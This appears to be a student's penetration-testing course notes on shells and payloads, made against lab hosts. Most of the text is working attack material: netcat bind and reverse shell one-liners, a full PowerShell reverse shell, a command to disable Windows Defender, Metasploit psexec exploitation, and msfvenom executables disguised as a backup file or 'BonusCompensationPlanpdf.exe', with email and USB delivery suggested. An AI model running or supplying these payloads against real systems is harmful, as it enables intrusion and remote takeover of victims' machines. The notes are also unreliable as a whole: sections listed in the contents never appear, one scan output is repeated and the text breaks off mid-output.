- [Shells \& Payloads](#shells--payloads)
  - [Intro](#intro)
  - [Shell Basics](#shell-basics)
    - [Bind Shells](#bind-shells)
      - [Using Netcat](#using-netcat)
      - [Bind Shell Example](#bind-shell-example)
    - [Reverse Shells](#reverse-shells)
      - [Reverse Shell Example](#reverse-shell-example)
  - [Payloads](#payloads)
    - [Intro](#intro-1)
      - [Netcat/Bash Reverse Shell One Liner](#netcatbash-reverse-shell-one-liner)
      - [PowerShell One Liner](#powershell-one-liner)
    - [Automating Payloads \& Delivery with Metasploit](#automating-payloads--delivery-with-metasploit)
      - [Launching MSFconsole](#launching-msfconsole)
      - [Searching within Metasploit](#searching-within-metasploit)
      - [Option Selection](#option-selection)
      - [Examining an Exploit's Options](#examining-an-exploits-options)
      - [Setting Options](#setting-options)
      - [Exploiting](#exploiting)
      - [Interactive Shell](#interactive-shell)
    - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom)
      - [List Payloads](#list-payloads)
      - [Staged vs. Stageless](#staged-vs-stageless)
      - [Building a Stageless Payload for a Linux System](#building-a-stageless-payload-for-a-linux-system)
      - [Executing a Stageless Payload on a Linux System](#executing-a-stageless-payload-on-a-linux-system)
      - [Building a Stageless Payload for a Windows System](#building-a-stageless-payload-for-a-windows-system)
      - [Executing a Stageless Payload on a Windows System](#executing-a-stageless-payload-on-a-windows-system)
  - [Windows](#windows)
    - [Promiment Exploits](#promiment-exploits)
    - [Payloads to Consider](#payloads-to-consider)
    - [Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution](#tools-tactics-and-procedures-for-payload-generation-transfer-and-execution)
      - [Payload Generation](#payload-generation)
      - [Payload Transfer and Execution](#payload-transfer-and-execution)
    - [Example](#example)
  - [Unix/Linux](#unixlinux)
    - [Considerations](#considerations)
    - [Example](#example-1)
    - [Spawning a TTY Shell with Python](#spawning-a-tty-shell-with-python)
  - [Spawning Interactive Shells](#spawning-interactive-shells)
    - [/bin/sh -i](#binsh--i)
    - [Perl](#perl)
    - [Ruby](#ruby)
    - [Lua](#lua)
    - [AWK](#awk)
    - [Find](#find)
    - [Exec](#exec)
    - [VIM](#vim)
    - [Checking sudo Permissions](#checking-sudo-permissions)
  - [Web Shells](#web-shells)
    - [Laudanum](#laudanum)
      - [Usage](#usage)

---

# Shells & Payloads

## Intro

A shell is a program that provides a computer user with an interface to input instructions into the system and view text output. As pentesters and information security professionals, a shell is often the result of exploiting a vuln or bypassing security measures to gain interactive access to a host.

Establishing a shell also allows you to maintain persistence on the system, giving you more time to work. It can make it easier to use your attack tools, exfiltrate data, gather, store and document all the details of your attack.

In this context, a payload means a code crafted with the intent to exploit a vuln on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

## Shell Basics

### Bind Shells

With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.

#### Using Netcat

Once connected to the target box with ssh, start a nc listener:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be your server, and the attack box will be your client. Once you hit enter, the listener is started and awaiting a connection from the client.

Back on the client, you will use nc to connect to the listener you started on the server.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Connecting was successful, also on the server:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!   
```

That is not a proper shell though. It is just a nc TCP session you have established. You can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

Client:

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Server:

```bash
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

#### Bind Shell Example

On the server side, you will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands and conde in your payload will differ depending on the host OS you are delivering it to.

Back on the client, use nc to connect to the server now that a shell on the server is being served.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

### Reverse Shells

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

You will often use this kind of shell as you come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving you a better chance of going undetected.

#### Reverse Shell Example

You can starta nc listener on your attack box.

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

This time around with your listener, you are binding it to a common port (443), this port is usually for HTTPS connections. You may want to use common ports like this because when you initiate the connection to your listener, you want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get various websites throughout the workday.

Netcat can be used to initiate the reverse shell on the Windows side, but you must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as your tool on the Windows side.

The question, you should ask yourself, should be 'What applications and shell languages are hosted on the target?'.

In this example, the following command is used:

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This PowerShell code can also be called shell code or your payload.

When hitting enter:

```ps
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

The Windows Defender AV software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system you are trying to connect with.

Disabling AV:

```ps
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempting to execute the code again leads to:

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

## Payloads

### Intro

In InfoSec, the payload is the command and/or code that exploits the vuln in an OS and/or application. The payload is the command and/or code that performs the malicious action from a defensive perspective.

#### Netcat/Bash Reverse Shell One Liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

rm -f /tmp/f;
# -> removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files; the semi-colon is used to execute the command sequentially
mkfifo /tmp/f; 
# -> makes a FIFO named pipe file at the location specified
cat /tmp/f |
# -> concatenates the FIFO named pipe file /tmp/f, the pipe connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe
/bin/bash -i 2>&1 | 
# -> specifies the command language interpreter using the -i option to ensure the shell is interactive; 2>&1 ensures the standard error data stream and standard output data stream are redirected to the command following the pipe
nc 10.10.14.12 7777 > /tmp/f
# -> uses nc to send a connection to your attack host; the output will be redirected to /tmp/f, serving the bash shell to your waiting nc listener
```

#### PowerShell One Liner

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -c
# -> executes powershell.exe with no profile and executes the command/script block contained in the quotes
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
# -> sets/evaluates the variable $client equal to the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object; the .NET framework object will connect with the TCP socket listed in the parantheses; the semi-colon ensures the commands & code are executed sequentially
$stream = $client.GetStream();
# -> sets/evaluates the variable $stream equal to the $client variable and the .NET framework method called GetStream that facilitates network communications; the semi-colon ensures the commands & code are executed sequentially
[byte[]]$bytes = 0..65535|%{0};
# -> creates a byte type array called $bytes that returns 65,535 zeros as the values in the array; this is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
# -> starts a while loop containing the $i variable set equal to the .NET framework Stream.Read method; the parameters: buffer, offset, and count are defined inside the parantheses of the method
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
# -> sets/evaluates the variable $data equal to an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream into ASCII
$sendback = (iex $data 2>&1 | Out-String );
# -> sets/evaluates the variable $sendback equal to the Invoke-Expression cmdlet against the $data variable, then redirects the standard error and standard output through a pipe to the Out-String cmdlet which converts input objects into strings; because Invoke-Expression is used, everything stored in $data will be run on the local computer
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
# -> sets/evaluates the variable $sendback2 equal to the $sendback variable plus the string PS plus path to the working directory plus the string '> '; this will result in the shell prompt being PS C:\workingdirectoryofmachine >
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
# -> sets/evaluates the variable $sendbyte equal to the ASCII encoded byte stream that will use a TCP client to initiate a PS session with a nc listener running on the sandbox
$client.Close() 
# -> this is the TcpClient.Close method that will be used when the connection is terminated
```

### Automating Payloads & Delivery with Metasploit

#### Launching MSFconsole

```bash
d41y@htb[/htb]$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```

#### Searching within Metasploit

```bash
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

#### Option Selection

```bash
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

#### Examining an Exploit's Options

```bash
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

#### Setting Options

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

#### Exploiting

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

#### Interactive Shell

```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

### Crafting Payloads with MSFvenom

#### List Payloads

```bash
d41y@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```

#### Staged vs. Stageless

**Staged** payloads create a way for you to send over more components of your attack. You can think of it like you are "setting the stage" for something even more useful. Take for example ```linux/x86/shell/reverse_tcp```. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, thene executes the shellcode to establish a reverse shell. Of course, if you use Metasploit to run this payload, you will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.

**Stageless** payloads do not have a stage. Take for example ```linux/zarch/meterpreter_reverse_tcp```. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit you in environments where you do not have access to much bandwith and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if you deliver it by employing social engineering.

#### Building a Stageless Payload for a Linux System

```bash
d41y@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

msfvenom
# -> calls msfvenom
-p 
# -> creates a payload
linux/x64/shell_reverse_tcp
# -> specifies Linux 64-bit stageless payload that will initiate a TCP-based revshell
LHOST=10.10.14.113 LPORT=443
# -> when executed, will call back the specified IP address on the specified port
-f elf 
# -> specifies the format the generated binary will be in
> createbackup.elf
# -> creates the .elf binary and names the file createbackup.elf
```

#### Executing a Stageless Payload on a Linux System

You would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Common ways are:

- email message with a file attached
- download link on a website
- combined with a metasploit exploit module
- flash drive as part of an onsite pentest

When executed:

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

#### Building a Stageless Payload for a Windows System

```bash
d41y@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

# only difference to the above created payload: platform (Windows) and format (.exe)
```

#### Executing a Stageless Payload on a Windows System

This is another situation where you need to be creative in getting this payload delivered to a target system. Without any encoding or encryption, the payload in this form would almost certainly be detected by Windows Defender AV.

If AV is disabled and payload is executed:

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

## Windows

### Promiment Exploits

Some of the most exploited vulns in Windows are:

- MS08-067
- Eternal Blue
- PrintNightmare
- BlueKeep
- Sigred
- SeriousSam
- ZeroLogon

### Payloads to Consider

- DLLs
  - a Dynamic Linking Library (_DLL_) is a library file used in Microsoft OS to provide shared code and data that can be used by many different programs at once; these files are modular and allow you to have applications that are more dynamic and easier to update; as a penteser, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate your privileges to SYSTEM and/or bypass User Account Controls
- Batch
  - batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the cli; these files end with an extension of ```.bat```; you can use batch files to run commands on the host in an automated fashion; for example, you can have a batch file open on a port on the host, or connect back to your attacking box; once that is done, it can then perform basic enumeration steps and feed you info back over the open port
- VBS
  - VBScript is a lightweight scripting language based on Microsoft's Visual Basic; it is typically used as a client-side scripting language in webservers to enable dynamic web pages; VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code
- MSI
  - ```.MSI``` files serve as an installation database for the Windows Installer; when attempting to install a new application, the installer will look for the ```.msi``` file to understand all of the components required and how to find them; you can use the Windows installer by crafting a payload as an ```.msi``` file; once you have it on the host, you can run ```msiexec``` to execute your file, which will provide you with further access, such as an elevated revshell
- PowerShell
  - PS is both a shell environment and scripting language; it serves as Microsoft's modern shell environment in their OS; as a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like the shell component, takes input and output as .NET objects; PS can provide you with a plethora options when it comes to gaining a shell and execution on a host, among many other steps in your pentesting process

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

#### Payload Generation

Some possible resources are:

- MSFvenom & Metasploit-Framework
- Payloads All The Things
- Mythic C2 Framework
- Nishang
- Darkarmour

#### Payload Transfer and Execution

Windows hosts can provide you with several other avenues of payload delivery. Some are:

- Impacket
- Payloads All The Things
- SMB
- Remote Execution via MSF
- Other Protocols

### Example

```bash
d41y@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

...

d41y@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
